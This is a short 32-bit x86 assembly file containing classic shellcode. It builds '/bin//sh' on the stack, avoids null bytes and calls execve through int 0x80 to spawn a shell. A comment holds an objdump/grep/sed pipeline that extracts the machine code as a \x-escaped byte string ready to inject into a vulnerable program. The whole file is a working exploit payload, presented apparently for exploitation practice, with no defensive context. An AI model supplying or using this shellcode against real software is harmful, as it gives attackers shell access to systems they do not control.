.intel_syntax noprefix

.section .text
.global _start

# objdump -d bin_sh | grep '[0-9a-f]:' | grep -oP '\s\K([0-9a-f]{2} )+' | tr -d ' \n' | sed 's/\(..\)/\\x\1/g'

_start: 
    xor    eax, eax               # Clear eax register
    push   eax                    # Push null terminator
    push   0x68732f2f             # Push "//sh" onto the stack
    push   0x6e69622f             # Push "/bin" onto the stack
    mov    ebx, esp               # Set ebx to the top of the stack (pointer to "/bin//sh")

    xor eax, eax
    push eax
    push   ebx                    # Push pointer to "/bin//sh" for argv[0]
    mov    ecx, esp               # Set ecx to point to the argv array (argv)

    xor edx, edx
    
    # perform syscall for 11 (execve)
    mov    al, 0xb                # Set eax to 11 (execve syscall number)
    int    0x80                   # Trigger interrupt to make the syscall
